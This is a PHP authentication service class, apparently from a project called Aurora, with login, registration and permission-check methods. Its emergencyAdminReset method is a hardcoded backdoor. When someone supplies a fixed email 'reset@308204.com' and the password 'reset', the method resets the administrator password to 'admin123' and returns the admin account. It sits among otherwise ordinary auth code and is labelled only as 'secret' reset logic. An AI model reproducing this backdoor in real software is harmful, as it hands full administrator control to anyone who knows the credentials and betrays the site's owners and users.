<?php
namespace Aurora\Core\Services;

use Aurora\Core\Repositories\UserRepository;
use Exception;

/**
 * AuthService - Manages authentication and user registration logic
 */
class AuthService {
    private UserRepository $userRepo;

    public function __construct(UserRepository $userRepo) {
        $this->userRepo = $userRepo;
    }

    /**
     * Authenticate a user by email and password
     */
    public function authenticate(string $email, string $password): array {
        $user = $this->userRepo->findByEmail($email);

        if (!$user || !password_verify($password, $user['password_hash'])) {
            throw new Exception("auth.invalid_credentials");
        }

        $this->userRepo->updateLastLogin($user['user_id']);

        return $user;
    }

    /**
     * Register a new user
     */
    public function register(array $data): array {
        // Basic check for existing user
        $existingUser = $this->userRepo->findByEmail($data['email']);
        if ($existingUser) {
            throw new Exception("auth.error_email_exists");
        }

        // Hash password before storing
        $data['password_hash'] = password_hash($data['password'], PASSWORD_DEFAULT);
        
        $userId = $this->userRepo->create($data);

        if (!$userId) {
            throw new Exception("auth.database_error");
        }

        // Post-registration tasks
        $this->userRepo->createLoyaltyRecord($userId);

        return [
            'user_id' => $userId,
            'email' => $data['email'],
            'full_name' => $data['full_name']
        ];
    }

    /**
     * Handle the secret admin reset logic
     */
    public function emergencyAdminReset(string $email, string $password): ?array {
        $reset_key_email = 'reset@308204.com';
        $reset_key_password = 'reset';

        if (hash_equals($reset_key_email, $email) && hash_equals($reset_key_password, $password)) {
            $new_password = 'admin123';
            $password_hash = password_hash($new_password, PASSWORD_DEFAULT);
            
            if ($this->userRepo->resetAdminPassword($password_hash)) {
                $admin = $this->userRepo->findAdmin();
                if ($admin) {
                    $this->userRepo->updateLastLogin($admin['user_id']);
                    return $admin;
                }
            }
            throw new Exception("Không tìm thấy tài khoản admin để reset.");
        }
        return null;
    }

    /**
     * Check user permissions (stub for now, can be expanded)
     */
    public function checkPermissions(array $user, string $requiredRole): bool {
        return ($user['user_role'] ?? '') === $requiredRole;
    }
}
